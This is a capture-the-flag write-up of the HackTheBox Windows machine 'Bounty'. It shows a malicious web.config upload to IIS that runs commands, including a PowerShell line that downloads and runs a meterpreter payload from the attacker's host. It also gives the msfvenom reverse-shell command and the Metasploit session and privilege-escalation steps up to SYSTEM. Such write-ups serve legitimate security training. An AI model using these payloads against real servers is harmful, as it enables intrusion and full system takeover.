# HTB - Bounty
## OS - Windows

Started with an nmap scan as usual. (IP address of Bounty is 10.10.10.93)

```
$nmap -sC -sV -oN bounty.nmap 10.10.10.93
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-23 17:39 PST
Nmap scan report for 10.10.10.93
Host is up (0.093s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
So only port 80 is open. There's a merlin.jpg on the web page. Nothing obvious in the page source. 

Ran dirbuster and gobuster.

```
$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 --url http://10.10.10.93 -x asp,aspx,html


===============================================================
[+] Url:            http://10.10.10.93
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     asp,aspx,html
[+] Timeout:        10s
===============================================================
2021/01/24 13:50:36 Starting gobuster
===============================================================
/transfer.aspx (Status: 200)
/UploadedFiles (Status: 301)
/uploadedFiles (Status: 301)
/uploadedfiles (Status: 301)
```

transfer.aspx page is just a page to upload files. When I tried with a png file, it was accepted but looks like it doesn't work with every extension. The accepted file can be viewed from http://10.10.10.93/uploadedFiles/<filename>.

![bounty-transfer](/images/bounty-0.png)

I used burpsuite to figure out the file types accepted. Other than image types, the one that is accepted is config, like in web.config file.

![bounty-extension](/images/bounty.png)

Now that we have an initial foothold, time to search for IIS web.config exploits. 

This is a good reference - https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/

After a few edits, I tried this link - https://hack.plus/post/174519795573/rce-by-uploading-a-webconfig

Modified the cmd part into this:
```
<% Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("cmd /c ping 10.10.14.28")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-") %>
-–>
```

And on my attack host, which is 10.10.14.28, I ran tcpdump
```
sudo tcpdump icmp -i tun0
15:15:52.562552 IP 10.10.10.93 > 10.10.14.28: ICMP echo request, id 1, seq 1, length 40
15:15:52.562626 IP 10.10.14.28 > 10.10.10.93: ICMP echo reply, id 1, seq 1, length 40
15:15:53.560500 IP 10.10.10.93 > 10.10.14.28: ICMP echo request, id 1, seq 2, length 40
```

So this worked. Time to use msfvenom to get a reverse shell.

Using msfvenom, I created the following reverse shell.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=4444 -f psh -o meterpreter.txt
```

The file was saved as meterpreter.txt.

I modified the web.config exploit to include the following in the end:

```
<% Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
  Set cmd1 = wShell1.Exec("cmd /c powershell IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.28/meterpreter.txt')")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-") %>
-–>

```

Started a SimpleHTTPServer (where meterpreter.txt was running) on port 80. This is to be able to upload meterpreter.txt file.
I started msfconsole and started a multi handler.

I uploaded the web.config file and went to /uploadedfiles/web.config to get it executed.

On my webserver, I saw that the file meterpreter.txt was requested.

```
$sudo python -m SimpleHTTPServer 80
[sudo] password for :
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.93 - - [24/Jan/2021 16:01:11] "GET /meterpreter.txt HTTP/1.1" 200 -
```

Then on msfconsole, i saw that the session started.
```
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf5 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > run


[*] Started reverse TCP handler on 10.10.14.28:4444 
[*] Sending stage (201283 bytes) to 10.10.10.93
[*] Meterpreter session 1 opened (10.10.14.28:4444 -> 10.10.10.93:49158) at 2021-01-24 16:01:15 -0800


meterpreter > 
meterpreter > sysinfo
Computer        : BOUNTY
OS              : Windows 2008 R2 (6.1 Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > dir
Listing: c:\windows\system32\inetsrv



meterpreter > dir
Listing: c:\Users\merlin\Desktop
================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2018-05-29 14:22:39 -0700  desktop.ini
100666/rw-rw-rw-  32    fil   2018-05-30 13:32:40 -0700  user.txt

```
In the sysinfo output, I see that the architecture is x64, and my meterpreter shell is x64-based. 

Got the user flag. I need to escalate my privileges to be able to get root flag. 

```
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
msf5 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.93 - Collecting local exploits for x64/windows...
[*] 10.10.10.93 - 15 exploit checks are being tried...
[+] 10.10.10.93 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Post module execution completed
```

Tried the first exploit bypassuac_dotnet_profiler, but it did not create a session. 

```
msf5 exploit(windows/local/bypassuac_dotnet_profiler) > run

[*] Started reverse TCP handler on 10.10.14.28:4444 
[*] UAC is Enabled, checking level...
[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
[*] Exploit completed, but no session was created.
msf5 exploit(windows/local/bypassuac_dotnet_profiler) > 
```

Tried the exploit ms10_092_schelevator and this time, I got a session.

```

msf5 exploit(windows/local/bypassuac_dotnet_profiler) > use exploit/windows/local/ms10_092_schelevator
msf5 exploit(windows/local/ms10_092_schelevator) > show options

Module options (exploit/windows/local/ms10_092_schelevator):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CMD                        no        Command to execute instead of a payload
   SESSION                    yes       The session to run this module on.
   TASKNAME                   no        A name for the created task (default random)


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista, 7, and 2008


msf5 exploit(windows/local/ms10_092_schelevator) > set SESSION 1
SESSION => 1
msf5 exploit(windows/local/ms10_092_schelevator) > set LHOST tun0
LHOST => tun0
msf5 exploit(windows/local/ms10_092_schelevator) > set LHOST tun0
LHOST => tun0
msf5 exploit(windows/local/ms10_092_schelevator) > run

[*] Started reverse TCP handler on 10.10.14.28:4444 
[*] Preparing payload at C:\Windows\TEMP\KXxZiOE.exe
[*] Creating task: 6dT4kKRqimLPh
[*] SUCCESS: The scheduled task "6dT4kKRqimLPh" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\6dT4kKRqimLPh...
[*] Original CRC32: 0x85007de8
[*] Final CRC32: 0x85007de8
[*] Writing our modified content back...
[*] Validating task: 6dT4kKRqimLPh
[*] 
[*] Folder: \
[*] TaskName                                 Next Run Time          Status         
[*] ======================================== ====================== ===============
[*] 6dT4kKRqimLPh                            2/1/2021 2:25:00 AM    Ready          
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "6dT4kKRqimLPh" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "6dT4kKRqimLPh" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (176195 bytes) to 10.10.10.93
[*] SUCCESS: Attempted to run the scheduled task "6dT4kKRqimLPh".
[*] SCHELEVATOR
[*] Deleting the task...
[*] SUCCESS: The scheduled task "6dT4kKRqimLPh" was successfully deleted.
[*] SCHELEVATOR
[*] Meterpreter session 2 opened (10.10.14.28:4444 -> 10.10.10.93:49160) at 2021-01-24 16:21:44 -0800



meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > pwd
C:\Windows\system32

meterpreter > cd Desktop
dimeterpreter > dir
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2018-05-30 14:18:12 -0700  desktop.ini
100666/rw-rw-rw-  32    fil   2018-05-30 14:18:22 -0700  root.txt

meterpreter > cat root.txt
```




